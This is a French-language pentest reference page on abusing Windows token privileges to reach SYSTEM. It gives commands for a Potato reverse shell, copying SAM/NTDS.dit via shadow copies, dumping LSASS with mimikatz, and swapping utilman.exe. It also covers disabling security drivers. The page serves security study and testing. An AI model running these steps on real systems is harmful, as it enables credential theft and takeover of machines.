# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Si vous ne **savez pas ce que sont les Windows Access Tokens**, lisez cette page avant de continuer :


{{#ref}}
access-tokens.md
{{#endref}}

**Vous pourriez peut-être élever vos privilèges en abusant des tokens que vous avez déjà**

### SeImpersonatePrivilege

Il s'agit d'un privilège détenu par n'importe quel processus qui permet l'imitation (mais pas la création) de n'importe quel token, à condition qu'un handle vers celui-ci puisse être obtenu. Un token privilégié peut être acquis depuis un service Windows (DCOM) en l'obligeant à effectuer une authentification NTLM contre un exploit, permettant ensuite l'exécution d'un processus avec les privilèges SYSTEM. Cette vulnérabilité peut être exploitée à l'aide de divers outils, tels que [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (qui nécessite que winrm soit désactivé), [SweetPotato](https://github.com/CCob/SweetPotato), et [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Notes de l'opérateur moderne :

- **JuicyPotato est legacy** : sur Windows 10 1809+/Server 2019+, préférez **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, ou **PrintSpoofer** selon la surface RPC/COM encore atteignable.
- Si vous avez compromis un service exécuté en tant que **`LOCAL SERVICE`** ou **`NETWORK SERVICE`** et que `whoami /priv` affiche un **filtered token** sans `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, récupérez d'abord le **set de privilèges par défaut** du compte (par exemple avec **FullPowers**) puis réessayez ensuite la famille potato.
- Certains forks plus récents sont plus faciles à utiliser que les outils originaux. Par exemple, **SigmaPotato** ajoute l'exécution par reflection/en mémoire et la compatibilité avec les versions modernes de Windows, tandis que **PrintNotifyPotato** abuse du service COM PrintNotify et est souvent utile lorsque le chemin Spooler classique est désactivé.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

C’est très similaire à **SeImpersonatePrivilege**, il utilisera la **même méthode** pour obtenir un token privilégié.\
Ensuite, ce privilège permet **d’assigner un primary token** à un nouveau process/processus suspendu. Avec le privileged impersonation token, vous pouvez dériver un primary token (DuplicateTokenEx).\
Avec le token, vous pouvez créer un **nouveau process** avec 'CreateProcessAsUser' ou créer un process suspendu et **définir le token** (en général, vous ne pouvez pas modifier le primary token d’un process en cours d’exécution).

### SeTcbPrivilege

Si vous avez ce token activé, vous pouvez utiliser **KERB_S4U_LOGON** pour obtenir un **impersonation token** pour n’importe quel autre utilisateur sans connaître les credentials, **ajouter un groupe arbitraire** (admins) au token, définir le **integrity level** du token sur "**medium**", et assigner ce token au **current thread** (SetThreadToken).

### SeBackupPrivilege

Le système est amené à **accorder tout accès en lecture** à n’importe quel fichier (limité aux opérations de lecture) par ce privilège. Il est utilisé pour **lire les password hashes de comptes Administrator locaux** depuis le registry, après quoi des outils comme "**psexec**" ou "**wmiexec**" peuvent être utilisés avec le hash (technique Pass-the-Hash). Cependant, cette technique échoue dans deux cas : lorsque le compte Local Administrator est disabled, ou lorsqu’une policy est en place et retire les droits administratifs aux Local Administrators se connectant à distance.\
En pratique, le workflow intégré le plus fiable est généralement **VSS + `robocopy /b`** : créer/exposer une shadow copy, puis copier `SAM`/`SYSTEM` ou `NTDS.dit` en **backup mode**, ce qui contourne les ACLs du fichier.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Vous pouvez **abuse this privilege** avec :

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- en suivant **IppSec** dans [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ou comme expliqué dans la section **escalating privileges with Backup Operators** de :


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

L'autorisation d'**écrire** dans n'importe quel fichier système, indépendamment de l'Access Control List (ACL) du fichier, est fournie par ce privilege. Elle ouvre de nombreuses possibilités d'escalade, notamment la capacité de **modifier des services**, de réaliser du DLL Hijacking, et de définir des **debuggers** via Image File Execution Options, parmi diverses autres techniques.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege est une permission puissante, particulièrement utile lorsqu'un utilisateur possède la capacité d'impersonate des tokens, mais aussi en l'absence de SeImpersonatePrivilege. Cette capacité repose sur la possibilité d'impersonate un token qui représente le même utilisateur et dont le niveau d'intégrité ne dépasse pas celui du processus courant.

**Points clés :**

- **Impersonation sans SeImpersonatePrivilege :** Il est possible d'exploiter SeCreateTokenPrivilege pour faire de l'EoP en impersonant des tokens sous certaines conditions.
- **Conditions pour l'impersonation de token :** Une impersonation réussie exige que le token cible appartienne au même utilisateur et ait un niveau d'intégrité inférieur ou égal à celui du processus qui tente l'impersonation.
- **Création et modification de tokens d'impersonation :** Les utilisateurs peuvent créer un token d'impersonation et l'améliorer en ajoutant le SID (Security Identifier) d'un groupe privilégié.

### SeLoadDriverPrivilege

Ce privilege permet de **charger et décharger des drivers de périphérique** avec la création d'une entrée de registre contenant des valeurs spécifiques pour `ImagePath` et `Type`. Comme l'accès en écriture direct à `HKLM` (HKEY_LOCAL_MACHINE) est restreint, `HKCU` (HKEY_CURRENT_USER) doit être utilisé à la place. Cependant, pour que `HKCU` soit reconnu par le kernel pour la configuration du driver, un chemin spécifique doit être suivi.

L'utilisation offensive moderne est généralement **BYOVD** (bring your own vulnerable driver) : charger un **driver kernel signé mais vulnérable** puis utiliser ses IOCTLs pour désactiver les protections ou atteindre l'exécution de code kernel. Gardez à l'esprit que sur les builds récents de Windows 11/Server, la **Microsoft vulnerable driver blocklist** et/ou **HVCI/Memory Integrity** cassent souvent les anciennes chaînes publiques, donc les exemples classiques de type `szkg64.sys` ne sont plus universellement fiables.

Ce chemin est `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, où `<RID>` est le Relative Identifier de l'utilisateur courant. Dans `HKCU`, ce chemin entier doit être créé, et deux valeurs doivent être définies :

- `ImagePath`, qui est le chemin du binaire à exécuter
- `Type`, avec une valeur de `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Étapes à suivre :**

1. Accéder à `HKCU` au lieu de `HKLM` en raison de l'accès en écriture restreint.
2. Créer le chemin `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` dans `HKCU`, où `<RID>` représente le Relative Identifier de l'utilisateur courant.
3. Définir `ImagePath` sur le chemin d'exécution du binaire.
4. Attribuer `Type` à `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Plus de façons d’abuser de ce privilège dans [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

C’est similaire à **SeRestorePrivilege**. Sa fonction principale permet à un processus de **s’approprier un objet**, en contournant l’exigence d’un accès discrétionnaire explicite grâce à la fourniture de droits d’accès WRITE_OWNER. Le processus consiste d’abord à obtenir la propriété de la clé de registre visée afin de pouvoir y écrire, puis à modifier la DACL pour autoriser les opérations d’écriture.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Cette privilège permet de **debug other processes**, y compris de lire et écrire dans la mémoire. Diverses stratégies d’injection en mémoire, capables de contourner la plupart des antivirus et des solutions de prévention d’intrusion sur l’hôte, peuvent être employées avec ce privilège.

Sur les versions modernes de Windows, rappelle-toi que `SeDebugPrivilege` suffit généralement pour ouvrir des **processus SYSTEM non protégés** et dupliquer leurs tokens, mais ce n’est **pas** une garantie que tu peux toucher **LSASS**. Si **RunAsPPL / LSA Protection** est activé, les processus non protégés ne peuvent pas lire ni injecter dans LSASS même si `SeDebugPrivilege` est présent. Dans ce cas, vole un token depuis un autre processus SYSTEM non-PPL, ou enchaîne avec un contournement PPL/BYOVD au lieu de supposer que `procdump` fonctionnera. Pour un exemple complet de copie de token utilisant `SeDebugPrivilege` + `SeImpersonatePrivilege`, consulte [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Tu peux utiliser [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) depuis la [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) pour **capturer la mémoire d’un processus**. Plus précisément, cela peut s’appliquer au processus **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, qui est responsable du stockage des identifiants utilisateur une fois qu’un utilisateur s’est authentifié avec succès sur un système.

Tu peux ensuite charger ce dump dans mimikatz pour obtenir les mots de passe :
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Si vous voulez obtenir un shell `NT SYSTEM`, vous pouvez utiliser :

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Ce droit (Perform volume maintenance tasks) permet d’ouvrir des handles bruts de périphérique de volume (par ex., \\.\C:) pour des E/S disque directes qui contournent les ACL NTFS. Avec lui, vous pouvez copier des octets de n’importe quel fichier sur le volume en lisant les blocs sous-jacents, ce qui permet une lecture arbitraire de fichiers sensibles (par ex., clés privées machine dans %ProgramData%\Microsoft\Crypto\, ruches de registre, SAM/NTDS via VSS). C’est particulièrement impactant sur les serveurs CA, où l’exfiltration de la clé privée CA permet de forger un Golden Certificate pour usurper n’importe quel principal.

Voir les techniques détaillées et les mitigations :

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Check privileges
```
whoami /priv
```
Les **tokens qui apparaissent comme Disabled** peuvent généralement être activés, donc vous pouvez souvent abuser à la fois des privilèges _Enabled_ et _Disabled_.

### Enable All the tokens

Si vous avez des privilèges désactivés, vous pouvez utiliser le script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) pour activer tous les tokens:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Ou le **script** intégré dans ce [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Full token privileges cheatsheet at [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), le résumé ci-dessous ne listera que les moyens directs d’exploiter le privilege pour obtenir une session admin ou lire des fichiers sensibles.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Merci à [Aurélien Chalot](https://twitter.com/Defte_) pour la mise à jour. J’essaierai bientôt de le reformuler de manière plus recipe-like.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Lire des fichiers sensibles avec `robocopy /b` ou des helpers de copie dédiés compatibles SeBackup.                                                                                                                                                                                                                                                                 | <p>- Très utile pour `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, et parfois `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` est pratique, mais des cmdlets/APIs dédiées à SeBackup sont souvent plus flexibles pour les fichiers verrouillés/ouverts.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Créer un token arbitraire incluant les droits admin locaux avec `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Dupliquer un token SYSTEM **non-PPL** ou dumper la mémoire d’un processus non protégé.                                                                                                                                                                                                                                                                 | <p>Le dump de LSASS est généralement bloqué si RunAsPPL/LSA Protection est activé.</p><p>Script à trouver sur [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Utiliser la **famille Potato** / l’impersonation via named-pipe pour lancer SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Le plus pratique depuis des comptes de service comme IIS APPPOOL, MSSQL, des scheduled tasks, ou tout contexte qui possède déjà `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Charger un kernel driver signé mais vulnérable (BYOVD)<br>2. Utiliser les IOCTLs du driver pour obtenir un R/W kernel, désactiver les outils de sécurité, ou élever vers SYSTEM<br><br>Alternativement, le privilege peut être utilisé pour décharger des drivers liés à la sécurité avec la commande builtin <code>fltMC</code>, par ex. <code>fltMC sysmondrv</code></p>                     | <p>Les anciens drivers publics comme <code>szkg64.sys</code> sont de plus en plus bloqués sur les Windows modernes par la vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Lancer PowerShell/ISE avec le privilege SeRestore présent.<br>2. Activer le privilege avec <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Renommer utilman.exe en utilman.old<br>4. Renommer cmd.exe en utilman.exe<br>5. Verrouiller la console et appuyer sur Win+U</p> | <p>L’attaque peut être détectée par certains logiciels AV.</p><p>Une méthode alternative consiste à remplacer les binaires de service stockés dans "Program Files" en utilisant le même privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Renommer cmd.exe en utilman.exe<br>4. Verrouiller la console et appuyer sur Win+U</p>                                                                                                                                       | <p>L’attaque peut être détectée par certains logiciels AV.</p><p>Une méthode alternative consiste à remplacer les binaires de service stockés dans "Program Files" en utilisant le même privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipuler les tokens pour y inclure les droits admin locaux. Peut nécessiter SeImpersonate.</p><p>À vérifier.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Regardez ce tableau définissant les Windows tokens : [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Regardez [**ce papier**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) sur le privesc avec des tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
